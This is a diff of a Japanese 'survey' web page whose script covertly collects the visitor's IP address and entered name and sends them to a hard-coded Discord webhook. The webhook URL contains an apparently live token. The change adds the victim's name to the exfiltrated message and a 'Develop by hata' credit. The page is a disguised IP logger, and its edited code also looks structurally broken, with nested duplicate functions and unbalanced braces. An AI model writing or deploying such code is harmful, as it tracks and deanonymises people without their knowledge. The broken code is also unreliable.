@@ -4,7 +4,6 @@
         <meta charset="UTF-8" />
         <title>アンケート</title>
         <script>
-            function getIPAddress(){
                 var namae = document.myform.namae.value;
                 // IPアドレスを取得する関数
                 function getIPAddress() {
@@ -22,7 +21,7 @@
                     const webhookURL = "https://discord.com/api/webhooks/1385521042675728446/537quNdmzXbfcdXxiIuN-s4tJqi1UGK1FP2NRp_KKoIsYMoIkewRymXrqAn966583KzV";
                     const payload = {
                         embeds: [{
-                            title: "IP取得",
+                            title: namae + "の" +"IP取得",
                             description: `IPアドレス: ${ipAddress}`,
                             color: 3447003 // 青色に設定
                         }]
@@ -40,10 +39,8 @@
                             console.error("送信に失敗しました:", response.statusText);
                         }
                     })
-                    .catch(error => console.error("送信に失敗しました:", error));
-                }
-                document.write("IPの取得が完了しました")
-                    }
+                    .catch(error => console.error("送信に失敗しました:", error));}
+                    document.write("IPの取得が完了しました。" + "<br />" + "Develop by hata");
         </script>
     </head>
     <body>
